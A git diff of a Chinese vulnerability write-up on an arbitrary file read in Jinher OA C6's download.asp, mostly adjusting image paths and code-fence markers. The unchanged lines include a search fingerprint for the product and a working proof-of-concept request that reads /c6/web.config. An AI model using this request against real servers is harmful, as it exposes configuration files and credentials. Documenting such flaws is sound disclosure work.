@@ -20,9 +20,7 @@ app="Jinher-OA"
 
 登录页面如下
 
-![](images/202202090141493.png)
-
-
+![](../.gitbook/assets/202202090141493.png)
 
 漏洞文件为 download.asp
 
@@ -116,16 +114,16 @@ app="Jinher-OA"
 
 请求的POC为
 
-```plain
+```
 /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
 ```
 
-![](images/202202090141014.png)
+![](../.gitbook/assets/202202090141014.png)
 
 读取 web.config
 
-```plain
+```
 /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
 ```
 
-![](images/202202090141775.png)
+![](../.gitbook/assets/202202090141775.png)
